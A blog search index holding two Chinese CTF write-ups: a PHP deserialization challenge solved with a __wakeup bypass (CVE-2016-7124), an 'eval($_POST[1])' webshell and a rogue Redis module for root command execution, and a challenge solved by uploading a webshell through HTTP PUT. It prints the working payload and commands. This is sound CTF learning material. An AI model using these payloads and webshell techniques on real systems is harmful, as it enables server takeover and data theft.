<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>天翼杯2021 esay_eval</title>
      <link href="/2022/05/11/esay_eval/"/>
      <url>/2022/05/11/esay_eval/</url>
      
        <content type="html"><![CDATA[<p>题目源码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/"[BA]":(.*?):/s'</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"you want to bypass wakeup ? no !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上来是个简单（bushi）的反序列化拿shell，但是A类里面的<code>__wakeup()</code>函数会把我们传进去的<code>$code</code>属性置为空，这里我们只需要让<code>__wakeup()</code>函数失效，CVE-2016-7124:当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 __wakeup 函数的执行。(也可上b站看<a href="https://www.bilibili.com/video/BV1Z54y1U7up?spm_id_from=333.880.my_history.page.click">视频学习</a>）</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token string">'eval($_POST[1]);'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到了payload：?poc&#x3D;O:1:”B”:1:{s:1:”a”;O:1:”a”:2:{s:4:”code”;s:16:”eval($_POST[1]);”;}}直接不犹豫连接蚁剑.当我们以为就此结束可以拿到flag我们点击根目录发现这个shell没有访问权限，但是在&#x2F;var&#x2F;www&#x2F;html中有上传权限，所以可以通过上传恶意的so文件，通过蚁剑的redis管理插件，进行ssrf，然后包含恶意so文件（提供一<a href="https://github.com/Dliv3/redis-rogue-server">下载地址</a>）</p><p><img src="https://s2.loli.net/2022/05/11/jnw9QXU8NWF5eK1.png" alt="image.png"></p><p><strong>注</strong>：因为插件市场这个东西，国内基本是访问不到，我在用蚁剑访问的时候，就一直转圈圈转不出来，所以可以使用github的插件仓库下载插件，然后手动放到<strong>antSword-master&#x2F;antData&#x2F;pulgins</strong>中，再次打开蚁剑后，会自动加载该插件（或者科学上网）</p><p>我们上传一个exp.so文件</p><p><img src="https://s2.loli.net/2022/05/11/hBI54UzwPbXysgo.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/05/11/39SgHdzWhoZRnEJ.png" alt="image.png"></p><p>密码是根据&#x2F;var&#x2F;www&#x2F;html中有个config.php.swp文件，其中有密码</p><p><img src="https://s2.loli.net/2022/05/11/pcECsYOIgrRfPv5.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/05/11/4w9d3VIzTHDgM1x.png" alt="image.png"></p><p>然后执行指令</p><p><img src="https://s2.loli.net/2022/05/11/8CGLhlsyeDYir3N.png" alt="image.png"></p><pre><code>MODULE LOAD /var/www/html/exp.sosystem.exec &quot;whoami&quot;</code></pre><p>这里我们发现是root权限</p><p><img src="https://s2.loli.net/2022/05/11/lAhN2fa8yWSCPwk.png" alt="image.png"></p><p>直接看根目录   然后找到flag</p><pre><code>system.exec &quot;ls /&quot;system.exec &quot;cat /flag*&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Round#1 Basic</title>
      <link href="/2022/05/10/NSSCTF-Round1/"/>
      <url>/2022/05/10/NSSCTF-Round1/</url>
      
        <content type="html"><![CDATA[<h3 id="basic-check"><a href="#basic-check" class="headerlink" title="basic_check"></a><strong>basic_check</strong></h3><p>第一次拿到web题的一血还是有点小激动的（借助了一下同队<a href="http://www.mufengnet.ltd/">暮渢</a>的思路hhh）</p><p>原题目来自<a href="https://www.ctfer.vip/">NSSCTF</a></p><p>首先我们拿到题目</p><p><img src="https://s2.loli.net/2022/05/11/KzXjMAuH1xte4qF.png" alt="1.png"></p><p>然后我们尝试按F12寻找思路，好的发现什么也没有，然后我就识图通过dirsearch查询是否有其他可以访问的网站地址</p><pre class="line-numbers language-python"><code class="language-python">python3 direarch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">1.14</span><span class="token punctuation">.</span><span class="token number">71.254</span><span class="token punctuation">:</span><span class="token number">28</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/11/SBpoW9yJdFwNOeH.png" alt="2.png"></p><p>两个都是主页 我们直接进入kali虚拟机  通过nikto扫一下</p><p><img src="https://s2.loli.net/2022/05/11/zGf4tuhqJPogBxe.png" alt="3.png"></p><p>漫长的等待  仔细看我们会发现</p><p><img src="https://s2.loli.net/2022/05/11/QLxgi9qsUAVCoE5.png" alt="4.png"></p><p>这个网站可以通过PUT方法  直接用firefox的扩展RESTClient</p><p><img src="https://s2.loli.net/2022/05/11/RQBpWHYCm4vqP1e.png" alt="5.png"> </p><p>上传成功，访问发现正常解析 直接蚁剑连接  在根目录下找到flag</p><p><img src="https://s2.loli.net/2022/05/11/codtSCpQWwhLFg9.png" alt="6.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
